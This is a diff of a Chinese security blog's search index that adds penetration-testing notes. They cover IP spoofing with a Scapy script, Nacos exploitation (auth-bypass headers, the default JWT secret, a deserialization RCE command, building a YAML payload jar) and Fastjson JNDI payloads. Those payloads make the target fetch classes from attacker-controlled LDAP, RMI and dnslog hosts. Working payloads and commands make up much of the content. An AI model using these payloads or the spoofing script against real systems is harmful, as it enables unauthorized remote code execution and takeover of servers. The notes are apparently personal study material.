@@ -1,6 +1,139 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ip伪造分析</title>
+    <url>/2026/01/19/ip%E4%BC%AA%E9%80%A0%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚开始认为ip伪造只是简单的更改http请求里面的请求头，后面发现可以更改的地方还是比较多的，记录一下，目前学到的</p>
+<p><strong>应用层(HTTP)</strong>  ：xff等ip请求头伪造					用于伪造ip</p>
+<p><strong>网络层&#x2F;传输层</strong> ：IP 层伪造（Scapy 库构建）			用于反射 &#x2F; 放大攻击&#x2F;DDoS &#x2F; SYN Flood</p>
+<p><strong>防御</strong>：采用TCP 握手的源 IP【该ip是内核给的】、在路由器上启用RPF检查</p>
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>对比点</th>
+<th>IP 层伪造（Scapy 那种）</th>
+<th>XFF 伪造</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>所在层级</td>
+<td><strong>网络层 &#x2F; 传输层</strong></td>
+<td><strong>应用层（HTTP）</strong></td>
+</tr>
+<tr>
+<td>改的是什么</td>
+<td>IP 包头里的 <code>src IP</code></td>
+<td>HTTP Header</td>
+</tr>
+<tr>
+<td>能否完成 TCP 握手</td>
+<td>❌ 不能</td>
+<td>✅ 能</td>
+</tr>
+<tr>
+<td>服务器看到的 TCP IP</td>
+<td>❌ 假的</td>
+<td>✅ 真的</td>
+</tr>
+<tr>
+<td>nginx <code>remote_addr</code></td>
+<td>❌ 伪造值</td>
+<td>✅ 真实值</td>
+</tr>
+<tr>
+<td>能否正常访问接口</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>主要用途</td>
+<td>DDoS &#x2F; 反射攻击</td>
+<td>绕业务逻辑</td>
+</tr>
+<tr>
+<td>安全价值</td>
+<td>网络攻击</td>
+<td>Web 漏洞利用</td>
+</tr>
+</tbody></table>
+<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>这个就是抓包软件抓到然后改请求头就行了，常用的ip伪造请求头如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">Forwarded: 127.0.0.1</span><br><span class="line">X-Requested-With: 127.0.0.1</span><br><span class="line">X-Forwarded-Proto: 127.0.0.1</span><br><span class="line">X-Forwarded-Host: 127.0.0.1</span><br><span class="line">X-remote-IP: 127.0.0.1</span><br><span class="line">X-remote-addr: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP: 127.0.0.1</span><br><span class="line">Cdn-Src-Ip: 127.0.0.1</span><br><span class="line">Cdn-Real-Ip: 127.0.0.1</span><br><span class="line">CF-Connecting-IP: 127.0.0.1</span><br><span class="line">X-Cluster-Client-IP: 127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP: 127.0.0.1</span><br><span class="line">Proxy-Client-IP: 127.0.0.1</span><br><span class="line">Fastly-Client-Ip: 127.0.0.1</span><br><span class="line">True-Client-Ip: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Host: 127.0.0.1</span><br><span class="line">X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="网络层-传输层"><a href="#网络层-传输层" class="headerlink" title="网络层&#x2F;传输层"></a>网络层&#x2F;传输层</h1><p><a href="https://blog.csdn.net/2302_82189125/article/details/139293229">使用 Scapy 库编写 IP 地址欺骗攻击脚本_scapy ip-CSDN博客</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from scapy.layers.inet import TCP</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def non_blind_spoofing(target_ip, spoofed_ip, target_port, seq_num, ack_num):</span><br><span class="line">    packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=12345, dport=target_port, seq=seq_num, ack=ack_num, flags=&quot;PA&quot;) / b&quot;Non-blind spoofing attack&quot;</span><br><span class="line">    send(packet)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    target_ip = &quot;192.168.134.148&quot;  # 目标系统的IP地址</span><br><span class="line">    spoofed_ip = &quot;192.168.1.1&quot;   # 伪造的源IP地址</span><br><span class="line">    target_port = 80             # 目标系统开放的端口</span><br><span class="line">    seq_num = 1000               # 合法通信中捕获的序列号</span><br><span class="line">    ack_num = 1001               # 合法通信中捕获的确认号</span><br><span class="line">    non_blind_spoofing(target_ip, spoofed_ip, target_port, seq_num, ack_num)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nacos系统漏洞</title>
+    <url>/2026/01/13/Nacos%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="1前言"><a href="#1前言" class="headerlink" title="1前言"></a>1前言</h1><p>知道泄露接口以及危险接口大致如下：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#文件上传</span><br><span class="line">/nacos/v1/cs/ops/data/removal</span><br><span class="line">#sql注入</span><br><span class="line">/nacos/v1/cs/ops/derby?sql=</span><br><span class="line">#获取nacos版本信息</span><br><span class="line">/nacos/v1/console/server/state</span><br><span class="line">#查看用户信息</span><br><span class="line">GET /nacos/v1/auth/users</span><br><span class="line">.........................</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/h0ny/NacosExploit">Nacos综合利用工具</a></p>
+<span id="more"></span>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#全选绕过的请求头</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Nacos-Server</span><br><span class="line"><span class="attribute">serverIdentity</span><span class="punctuation">: </span>security</span><br></pre></td></tr></table></figure>
+
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><h2 id="默认硬编码"><a href="#默认硬编码" class="headerlink" title="默认硬编码"></a>默认硬编码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#默认jwt密钥0.1.0&lt;=nacos&lt;=2.2.0</span><br><span class="line">nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 </span><br><span class="line"># =后边的是默认的硬编码</span><br></pre></td></tr></table></figure>
+
+<p>①<code>nacos</code>加密用户<code>accessToken</code>使用的<code>jwt</code>默认密钥加密，也就是只要知到<code>nacos</code>的用户，任何人都能通过此密钥加密用户得到对应用户的<code>accessToken</code></p>
+<h2 id="Nacos-JRaft-Services-文件操作漏洞"><a href="#Nacos-JRaft-Services-文件操作漏洞" class="headerlink" title="Nacos JRaft Services 文件操作漏洞"></a>Nacos JRaft Services 文件操作漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#JRaft（Nacos 内置一致性组件）用于快照同步的接口</span><br><span class="line">/nacos/v1/raft/snapshot</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Nacos-Hessian-反序列化漏洞"><a href="#Nacos-Hessian-反序列化漏洞" class="headerlink" title="Nacos Hessian 反序列化漏洞"></a>Nacos Hessian 反序列化漏洞</h2><ul>
+<li>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6</li>
+<li>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3</li>
+</ul>
+<p>poc：<a href="https://github.com/c0olw/NacosRce">https://github.com/c0olw/NacosRce</a></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar NacosRce.jar http://xxxx:xxx/nacos/ <span class="number">7848</span> &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="Nacos-Yaml反序列化漏洞"><a href="#Nacos-Yaml反序列化漏洞" class="headerlink" title="Nacos  Yaml反序列化漏洞"></a>Nacos  Yaml反序列化漏洞</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/nacos/v1/cs/configs?import=true&amp;namespace=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx:xx</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data;boundary=----xxxx</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">xxx</span></span></span><br></pre></td></tr></table></figure>
+
+<p>工具利用：<a href="https://github.com/artsploit/yaml-payload/">https://github.com/artsploit/yaml-payload/</a></p>
+<p>注意：</p>
+<p><code>yaml-payload</code>中的Java文件是弹出计算机，可以更改成添加用户再进行打包；参考文章<a href="https://xz.aliyun.com/news/12906">内网打靶—春秋云镜篇(6) –Hospital-先知社区</a></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#准备恶意文件</span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line"></span><br><span class="line">jar -cvf yaml-payload.jar -C src/</span><br><span class="line">#windows</span><br><span class="line">jar -cvf yaml-payload.jar -C src .</span><br><span class="line"></span><br><span class="line">#找个可以出网的地方监听一般是内网</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Spring-Cloud-Gateway攻击Redis"><a href="#Spring-Cloud-Gateway攻击Redis" class="headerlink" title="Spring Cloud Gateway攻击Redis"></a>Spring Cloud Gateway攻击Redis</h2><p>① Nacos 版本 ≤ <strong>1.4.x</strong><br>② <code>/nacos/v1/cs/configs</code> <strong>可未授权写</strong><br>③ 下游是 <strong>Spring &#x2F; Spring Cloud 应用</strong><br>④ 应用开启了 <strong>自动刷新 &#x2F; 动态配置</strong></p>
+<p>文章<a href="https://www.yulegeyu.com/2024/04/03/Spring-Cloud-Gateway%E6%94%BB%E5%87%BBRedis/">Spring Cloud Gateway攻击Redis | 雨了个雨’s blog</a></p>
+<h3 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h3><p>在nacos中通过编辑路由配置文件，通过新增路由以及配置AddResponseHeader过滤器执行SPEL表达式实现RCE</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>蓝凌OA远程RCE记录</title>
     <url>/2026/01/08/%E8%93%9D%E5%87%8COA%E8%BF%9C%E7%A8%8BRCE%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="1前言"><a href="#1前言" class="headerlink" title="1前言"></a>1前言</h1><p>知道存在命令执行的接口大致如下：</p>
@@ -2748,10 +2881,14 @@
 <span id="more"></span>
 
 <hr>
-<h3 id="漏洞验证步骤（仅访问-HTTP-服务）"><a href="#漏洞验证步骤（仅访问-HTTP-服务）" class="headerlink" title="漏洞验证步骤（仅访问 HTTP 服务）"></a>漏洞验证步骤（仅访问 HTTP 服务）</h3><h4 id="1-准备-Payload"><a href="#1-准备-Payload" class="headerlink" title="1. 准备 Payload"></a>1. 准备 Payload</h4><p>以下 Payload 会让目标服务器尝试连接 <code>192.168.1.12:8000</code>（需替换为你的 IP）：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞验证步骤（仅访问-HTTP-服务）"><a href="#漏洞验证步骤（仅访问-HTTP-服务）" class="headerlink" title="漏洞验证步骤（仅访问 HTTP 服务）"></a>漏洞验证步骤（仅访问 HTTP 服务）</h3><h4 id="1-准备-Payload"><a href="#1-准备-Payload" class="headerlink" title="1. 准备 Payload"></a>1. 准备 Payload</h4><p>以下 Payload 会让目标服务器尝试连接 ：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">#尝试访问内网</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#dnslog探测出网</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;qwq&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>原理</strong>：<br>当 Fastjson 解析 <code>autoCommit</code> 属性时，会调用 <code>setAutoCommit(true)</code> → 触发 JNDI 查找 → 访问 <code>dataSourceName</code> 中的地址。</p>
+<hr>
+<p>使用工具<code>jndi_tool.jar</code>部署恶意类；工具链接：<a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://xxx.xxx.xx.x:xxx/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h4 id="2-启动-HTTP-监听服务"><a href="#2-启动-HTTP-监听服务" class="headerlink" title="2. 启动 HTTP 监听服务"></a>2. 启动 HTTP 监听服务</h4><p>在 <code>192.168.1.12</code> 上执行：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
 
@@ -4184,7 +4321,7 @@
 <h6 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h6><p>↑强制代理{区别sockscap64：可看进程}</p>
 <h6 id="Fiddler-Classic"><a href="#Fiddler-Classic" class="headerlink" title="Fiddler Classic"></a>Fiddler Classic</h6><p>↑代理【渗透工具】</p>
 <h6 id="Charles"><a href="#Charles" class="headerlink" title="Charles"></a>Charles</h6><p>↑代理【渗透工具】</p>
-<h1 id="框架漏扫工具推荐"><a href="#框架漏扫工具推荐" class="headerlink" title="框架漏扫工具推荐"></a>框架漏扫工具推荐</h1><h3 id="常见框架漏扫工具推荐"><a href="#常见框架漏扫工具推荐" class="headerlink" title="常见框架漏扫工具推荐"></a>常见框架漏扫工具推荐</h3><h5 id="spring-boot框架"><a href="#spring-boot框架" class="headerlink" title="spring-boot框架"></a>spring-boot框架</h5><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6><h6 id="swagger-hack"><a href="#swagger-hack" class="headerlink" title="swagger-hack"></a><a href="https://github.com/jayus0821/swagger-hack">swagger-hack</a></h6><h5 id="thinkphp框架"><a href="#thinkphp框架" class="headerlink" title="thinkphp框架"></a>thinkphp框架</h5><h5 id="Weblogic框架"><a href="#Weblogic框架" class="headerlink" title="Weblogic框架"></a>Weblogic框架</h5><h5 id="nacos框架"><a href="#nacos框架" class="headerlink" title="nacos框架"></a>nacos框架</h5><h5 id="帆软框架"><a href="#帆软框架" class="headerlink" title="帆软框架"></a>帆软框架</h5>]]></content>
+<h1 id="框架漏扫工具推荐"><a href="#框架漏扫工具推荐" class="headerlink" title="框架漏扫工具推荐"></a>框架漏扫工具推荐</h1><h3 id="常见框架漏扫工具推荐"><a href="#常见框架漏扫工具推荐" class="headerlink" title="常见框架漏扫工具推荐"></a>常见框架漏扫工具推荐</h3><h5 id="spring-boot框架"><a href="#spring-boot框架" class="headerlink" title="spring-boot框架"></a>spring-boot框架</h5><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6><h6 id="swagger-hack"><a href="#swagger-hack" class="headerlink" title="swagger-hack"></a><a href="https://github.com/jayus0821/swagger-hack">swagger-hack</a></h6><h5 id="thinkphp框架"><a href="#thinkphp框架" class="headerlink" title="thinkphp框架"></a>thinkphp框架</h5><h5 id="Weblogic框架"><a href="#Weblogic框架" class="headerlink" title="Weblogic框架"></a>Weblogic框架</h5><h5 id="nacos框架"><a href="#nacos框架" class="headerlink" title="nacos框架"></a>nacos框架</h5><h6 id="NacosExploit"><a href="#NacosExploit" class="headerlink" title="NacosExploit"></a><strong><a href="https://github.com/h0ny/NacosExploit">NacosExploit</a></strong></h6><h5 id="帆软框架"><a href="#帆软框架" class="headerlink" title="帆软框架"></a>帆软框架</h5><h6 id="Frchannel"><a href="#Frchannel" class="headerlink" title="Frchannel"></a><a href="https://github.com/7wkajk/Frchannel/releases/tag/2">Frchannel</a></h6>]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
@@ -4283,6 +4420,7 @@
     <content><![CDATA[<h1 id="前端加密对抗"><a href="#前端加密对抗" class="headerlink" title="前端加密对抗"></a>前端加密对抗</h1><p>网址教学：<a href="https://xz.aliyun.com/news/14066">https://xz.aliyun.com/news/14066</a></p>
 <p>我主要使用的方法是其中的 <a href="https://github.com/jxhczhl/JsRpc">JsRpc</a>  +  python</p>
 <h3 id="1-找明码函数"><a href="#1-找明码函数" class="headerlink" title="[1]找明码函数"></a>[1]找明码函数</h3><p>找到其中明码所代表的变量，一般查找方式为查找关键字：<strong>encrypt</strong> ，来找到明码加密的函数</p>
+<p>通常银行之类的会采用<code>response.use</code>或者<code>request.use</code>进行发包或者监听响应，所以可以直接在开发者模式进行搜索然后打断点进行一步一步的调试</p>
 <h3 id="2-连rpc-设断点"><a href="#2-连rpc-设断点" class="headerlink" title="[2]连rpc-设断点"></a>[2]连rpc-设断点</h3><p>连接jsrpc，设置断点，设置全局变量，设置demo变量，设置demo变量的功能</p>
 <span id="more"></span>
 
